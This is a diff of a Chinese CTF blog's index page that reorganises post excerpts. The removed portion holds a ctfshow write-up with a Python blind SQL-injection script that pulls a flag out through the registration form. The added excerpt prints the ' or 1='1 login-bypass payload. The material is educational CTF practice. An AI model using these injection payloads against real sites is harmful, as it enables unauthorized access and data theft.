@@ -71,48 +71,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/03/02/test/" class="article-date">
-  <time class="dt-published" datetime="2022-03-02T14:05:25.000Z" itemprop="datePublished">2022-03-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/02/test/">test</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/02/test/" data-id="cl09mxta9000l30vj5dup4lia" data-title="test" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
     <article id="post-ctfshow内部赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/03/02/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/" class="article-date">
-  <time class="dt-published" datetime="2022-03-02T13:57:23.798Z" itemprop="datePublished">2022-03-02</time>
+    <a href="/2022/03/03/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/" class="article-date">
+  <time class="dt-published" datetime="2022-03-03T02:52:23.951Z" itemprop="datePublished">2022-03-03</time>
 </a>
     
   <div class="article-category">
@@ -127,7 +89,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/02/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">ctfshow内部赛</a>
+      <a class="p-name article-title" href="/2022/03/03/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">ctfshow内部赛</a>
     </h1>
   
 
@@ -136,37 +98,15 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <h1 id="ctfshow内部赛"><a href="#ctfshow内部赛" class="headerlink" title="ctfshow内部赛"></a>ctfshow内部赛</h1><p>最近想多刷一些题，就先从ctfshow的题目下手吧。</p>
-<h1 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h2 id="蓝瘦"><a href="#蓝瘦" class="headerlink" title="蓝瘦"></a>蓝瘦</h2><h2 id="出题人不想跟你说话-jpg"><a href="#出题人不想跟你说话-jpg" class="headerlink" title="出题人不想跟你说话.jpg"></a>出题人不想跟你说话.jpg</h2><h2 id="一览无余"><a href="#一览无余" class="headerlink" title="一览无余"></a>一览无余</h2><h2 id="登录就有flag"><a href="#登录就有flag" class="headerlink" title="登录就有flag"></a>登录就有flag</h2><h2 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h2><hr>
-<h2 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a>签到</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一道sql注入题目，只能说自己还有很多注入的姿势还没掌握。</p>
-<p>后来查资料看到了这题类似[网鼎杯 2018 unfinish]</p>
-<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>进入环境用<code>dirsearch</code>扫了一下，发现有<code>login.php、register.php、www.zip、user.php</code></p>
-
-
-<p><img src="/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/image-20210228123048630.png" alt="image-20210228123048630"></p>
-<p>就把源码下载了下来</p>
-<p>register.php：</p>
-<p><img src="/image-20210228123159617.png" alt="image-20210228123159617"></p>
-<p>源码中对很多关键词都进行了过滤</p>
-<p>user.php：</p>
-<p><img src="/image-20210228123744169.png" alt="image-20210228123744169"></p>
-<p>可以看到对用户名是否数字进行了判断，并且对长度进行了截取，会在返回值中返回<code>username</code>，所以我们就可以利用<code>username</code>进行回带值，注入点是在<code>register.php</code>传入的username中。</p>
-<h4 id="看一些sql语句"><a href="#看一些sql语句" class="headerlink" title="看一些sql语句"></a>看一些sql语句</h4><p><img src="/image-20210228124937579.png" alt="image-20210228124937579"></p>
-<p>如果用了<code>hex</code></p>
-<p><img src="/image-20210228125158298.png" alt="image-20210228125158298"></p>
-<p>但是还有个问题：</p>
-<p><img src="/image-20210228125452752.png" alt="image-20210228125452752"></p>
-<p><img src="/image-20210228125605735.png" alt="image-20210228125605735"></p>
-<p>可以发现<code>flag</code>在hex编码之后被截断了</p>
-<p>这个题要求的是纯数字，所以可以进行两次<code>hex</code>编码</p>
-<p><img src="/image-20210228125903954.png" alt="image-20210228125903954"></p>
-<p>由于前面对<code>username</code>回带的长度进行了截取，所以我们只能一次十位回带<code>flag</code>。</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url1 = <span class="string">&quot;http://3c7fe459-38fe-472f-90e2-eb144496bd2c.chall.ctf.show:8080/register.php&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://3c7fe459-38fe-472f-90e2-eb144496bd2c.chall.ctf.show:8080/login.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    payload=<span class="string">&quot;hex(hex(substr((select/**/flag/**/from/**/flag)from/**/&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;/**/for/**/1))),/*&quot;</span></span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    s=requests.session()</span><br><span class="line">    data1=&#123;</span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>:<span class="built_in">str</span>(i+<span class="number">30</span>)+<span class="string">&quot;&#x27;,username=&quot;</span>+payload,</span><br><span class="line">        <span class="string">&#x27;u&#x27;</span>:<span class="string">&quot;*/#&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;p&#x27;</span>:i+<span class="number">30</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">print</span>(data1[<span class="string">&#x27;e&#x27;</span>])</span><br><span class="line">    r1 = s.post(url1,data=data1)  </span><br><span class="line">    data2=&#123;</span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>:i+<span class="number">30</span>,</span><br><span class="line">        <span class="string">&#x27;p&#x27;</span>:i+<span class="number">30</span></span><br><span class="line">        &#125;</span><br><span class="line">    r2=s.post(url2,data=data2)</span><br><span class="line">    t =r2.text</span><br><span class="line">    real = re.findall(<span class="string">&quot;Hello (.*?),&quot;</span>,t)[<span class="number">0</span>]</span><br><span class="line">    flag+=real</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-
-
+        
+          <p class="article-more-link">
+            <a href="/2022/03/03/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/02/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/" data-id="cl09mxta1000930vjcbp99hjl" data-title="ctfshow内部赛" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/03/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/" data-id="cl09mxta1000930vjcbp99hjl" data-title="ctfshow内部赛" class="article-share-link">Share</a>
       
       
       
@@ -178,7 +118,7 @@
 
 
   
-    <article id="&#39;java-Security的学习" class="h-entry article article-type-&#39;java" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Security的学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="article-date">
   <time class="dt-published" datetime="2022-03-02T13:04:05.000Z" itemprop="datePublished">2022-03-02</time>
@@ -192,7 +132,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/">Security的学习&#39;</a>
+      <a class="p-name article-title" href="/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/">Java Security的学习</a>
     </h1>
   
 
@@ -204,7 +144,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="cl09mxt9z000630vj4nvk3amd" data-title="Security的学习&#39;" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="cl09mxt9z000630vj4nvk3amd" data-title="Java Security的学习" class="article-share-link">Share</a>
       
       
       
@@ -539,6 +479,51 @@
 
 
   
+    <article id="post-SQL注入之万能密码" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/" class="article-date">
+  <time class="dt-published" datetime="2021-01-08T03:36:41.000Z" itemprop="datePublished">2021-01-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/">SQL注入之万能密码</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入之万能密码"><a href="#SQL注入之万能密码" class="headerlink" title="SQL注入之万能密码"></a>SQL注入之万能密码</h1><p><code>&#39; or 1=&#39;1</code></p>
+<p>这是最简的万能密码了，今天记录一种看到的新的万能密码。</p>
+<p>当or、and以及注释符号被严格过滤时，便可以选择这种万能密码</p>
+        
+          <p class="article-more-link">
+            <a href="/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/" data-id="cl09mxt9w000330vj247lf55x" data-title="SQL注入之万能密码" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
 
 
   <nav id="page-nav">
@@ -596,15 +581,11 @@
       <ul>
         
           <li>
-            <a href="/2022/03/02/test/">test</a>
+            <a href="/2022/03/03/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">ctfshow内部赛</a>
           </li>
         
           <li>
-            <a href="/2022/03/02/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">ctfshow内部赛</a>
-          </li>
-        
-          <li>
-            <a href="/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/">Security的学习&#39;</a>
+            <a href="/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/">Java Security的学习</a>
           </li>
         
           <li>
@@ -613,6 +594,10 @@
         
           <li>
             <a href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/">[VNCTF2021]realezjvav复现</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/12/Python%E5%AD%A6%E4%B9%A0/">Python学习</a>
           </li>
         
       </ul>
